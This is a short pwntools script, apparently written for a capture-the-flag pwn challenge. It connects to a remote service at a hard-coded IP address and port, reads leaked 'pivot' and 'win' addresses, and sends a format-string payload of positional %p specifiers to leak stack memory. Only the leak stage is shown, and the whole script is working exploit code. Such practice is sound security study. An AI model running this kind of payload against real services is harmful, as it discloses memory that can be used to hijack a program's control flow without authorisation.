from pwn import *

p = remote('152.118.201.210', 2602)

p.recvuntil(b'pivot @ ')
pivot_addr = int(p.recvline().strip(), 16)
p.recvuntil(b'win @ ')
win_addr = int(p.recvline().strip(), 16)

print(f"alamat pivot {hex(pivot_addr)}")
print(f"alamat win {hex(win_addr)}")

payload = b'AAAAAAAA'
for i in range(1, 30):
    payload += f'.%{i}$p'.encode()

p.sendline(payload)
res = p.recvline()
print(res.decode())